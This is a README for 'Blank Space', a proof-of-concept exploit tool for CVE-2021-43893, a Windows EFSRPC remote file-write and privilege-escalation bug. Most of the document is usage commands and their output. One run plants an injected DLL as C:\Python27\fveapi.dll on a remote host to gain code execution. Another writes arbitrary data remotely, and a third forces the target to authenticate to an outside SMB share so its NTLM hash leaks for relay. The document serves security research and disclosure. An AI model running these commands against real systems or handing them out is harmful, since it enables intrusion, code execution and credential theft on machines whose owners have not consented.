# Blank Space

Blank Space is a refactoring of James Forshaw's [original proof of concept](https://www.youtube.com/watch?v=e-ORhEE9VVg) for [CVE-2021-43893](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43893), [EFSRPC arbitrary file upload privilege escalation](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-43893). Blank Space can create arbitrary files on a remote host that is using unconstrained delegation if it isn't patched for CVE-2021-43893. File creation is done using the privileges of the remote user, so code execution is a bit speculative but defintely a possibility. Blank Space can also be used to begin a relay attack even after CVE-2021-43893 has been patched. Similarly, admin users can overwrite existing files, although that arguably doesn't cross a security boundary.

Examples of both code execution, relay attacks, and file destruction are available in a Rapid7 blog I wrote. The PoC assuming the executing user can authenticate to the remote host.


## Usage

### Options

Blank Space always requires a remote host (`--rhost`) and a remote filename (`--filename`). CVE-2021-43893 is sort of specific to `\\.\C:\` filepaths, but I've left it up to the user how they define a path (e.g. `\\localhost\sharename` or `\\remotehost\share` are valid options depending on what you are doing).


```
C:\Users\lowlevel\blankspace\Release>.\blankspace.exe
 ____    ___                    __          ____
/\  _`\ /\_ \                  /\ \        /\  _`\
\ \ \L\ \//\ \      __      ___\ \ \/'\    \ \,\L\_\  _____      __      ___     __
 \ \  _ <'\ \ \   /'__`\  /' _ `\ \ , <     \/_\__ \ /\ '__`\  /'__`\   /'___\ /'__`\
  \ \ \L\ \\_\ \_/\ \L\.\_/\ \/\ \ \ \\`\     /\ \L\ \ \ \L\ \/\ \L\.\_/\ \__//\  __/
   \ \____//\____\ \__/.\_\ \_\ \_\ \_\ \_\   \ `\____\ \ ,__/\ \__/.\_\ \____\ \____\
    \/___/ \/____/\/__/\/_/\/_/\/_/\/_/\/_/    \/_____/\ \ \/  \/__/\/_/\/____/\/____/
                                                        \ \_\
                                                         \/_/
option "rhost" is required
Available options:
  -h, --help              Produces a help message
  -r, --rhost arg         The remote host to target
  -f, --filename arg      The name of the file to create/write to
  -s, --input-string arg  A string of data to write
  -i, --input-file arg    A string of data to write
  --relay                 Initiate NTLM hash leak
  --directory             Create a directory
```

### Creating a remote file using a file

```
C:\ProgramData>.\blankspace.exe -r vulnerable.okhuman.ninja -f \\.\C:\Python27\fveapi.dll -i ./dll_inject64.dll
 ____    ___                    __          ____
/\  _`\ /\_ \                  /\ \        /\  _`\
\ \ \L\ \//\ \      __      ___\ \ \/'\    \ \,\L\_\  _____      __      ___     __
 \ \  _ <'\ \ \   /'__`\  /' _ `\ \ , <     \/_\__ \ /\ '__`\  /'__`\   /'___\ /'__`\
  \ \ \L\ \\_\ \_/\ \L\.\_/\ \/\ \ \ \\`\     /\ \L\ \ \ \L\ \/\ \L\.\_/\ \__//\  __/
   \ \____//\____\ \__/.\_\ \_\ \_\ \_\ \_\   \ `\____\ \ ,__/\ \__/.\_\ \____\ \____\
    \/___/ \/____/\/__/\/_/\/_/\/_/\/_/\/_/    \/_____/\ \ \/  \/__/\/_/\/____/\/____/
                                                        \ \_\
                                                         \/_/
[+] Creating EFS RPC binding handle to vulnerable.okhuman.ninja
[+] Attempting to write to \\.\C:\Python27\fveapi.dll
[+] Encrypt the empty remote file...
[+] Reading the encrypted remote file object
[+] Read back 1244 bytes
[+] Writing 92160 bytes of attacker data to encrypted object::$DATA stream
[+] Decrypt the the remote file
[!] Success!

C:\ProgramData>
```

### Creating a remote file using a string

```
C:\Users\lowlevel\blankspace\Release>.\blankspace.exe -r 10.0.0.6 -f \\.\C:\ProgramData\hello -s "hello world!"
 ____    ___                    __          ____
/\  _`\ /\_ \                  /\ \        /\  _`\
\ \ \L\ \//\ \      __      ___\ \ \/'\    \ \,\L\_\  _____      __      ___     __
 \ \  _ <'\ \ \   /'__`\  /' _ `\ \ , <     \/_\__ \ /\ '__`\  /'__`\   /'___\ /'__`\
  \ \ \L\ \\_\ \_/\ \L\.\_/\ \/\ \ \ \\`\     /\ \L\ \ \ \L\ \/\ \L\.\_/\ \__//\  __/
   \ \____//\____\ \__/.\_\ \_\ \_\ \_\ \_\   \ `\____\ \ ,__/\ \__/.\_\ \____\ \____\
    \/___/ \/____/\/__/\/_/\/_/\/_/\/_/\/_/    \/_____/\ \ \/  \/__/\/_/\/____/\/____/
                                                        \ \_\
                                                         \/_/
[+] Creating EFS RPC binding handle to 10.0.0.6
[+] Attempting to write to \\.\C:\ProgramData\hello
[+] Encrypt the empty remote file...
[+] Reading the encrypted remote file object
[+] Read back 1244 bytes
[+] Writing 12 bytes of attacker data to encrypted object::$DATA stream
[+] Decrypt the the remote file
[!] Success!

C:\Users\lowlevel\blankspace\Release>
```


### Triggering a relay

```
C:\ProgramData>blankspace.exe -r yeet.okhuman.ninja -f \\10.0.0.3\r7\r7 --relay
 ____    ___                    __          ____
/\  _`\ /\_ \                  /\ \        /\  _`\
\ \ \L\ \//\ \      __      ___\ \ \/'\    \ \,\L\_\  _____      __      ___     __
 \ \  _ <'\ \ \   /'__`\  /' _ `\ \ , <     \/_\__ \ /\ '__`\  /'__`\   /'___\ /'__`\
  \ \ \L\ \\_\ \_/\ \L\.\_/\ \/\ \ \ \\`\     /\ \L\ \ \ \L\ \/\ \L\.\_/\ \__//\  __/
   \ \____//\____\ \__/.\_\ \_\ \_\ \_\ \_\   \ `\____\ \ ,__/\ \__/.\_\ \____\ \____\
    \/___/ \/____/\/__/\/_/\/_/\/_/\/_/\/_/    \/_____/\ \ \/  \/__/\/_/\/____/\/____/
                                                        \ \_\
                                                         \/_/
[+] Creating EFS RPC binding handle to yeet.okhuman.ninja
[+] Sending EfsRpcDecryptFileSrv for \\10.0.0.3\r7\r7
[-] EfsRpcDecryptFileSrv failed with status code: 53
[+] Network path not found error received!
[!] Success! Thanks, James!

C:\ProgramData>
```


## Credit

* James Forshaw - [Original issue discovery and proof of concept](https://bugs.chromium.org/p/project-zero/issues/detail?id=2228)
* [Taylor Swift](https://www.youtube.com/watch?v=e-ORhEE9VVg)
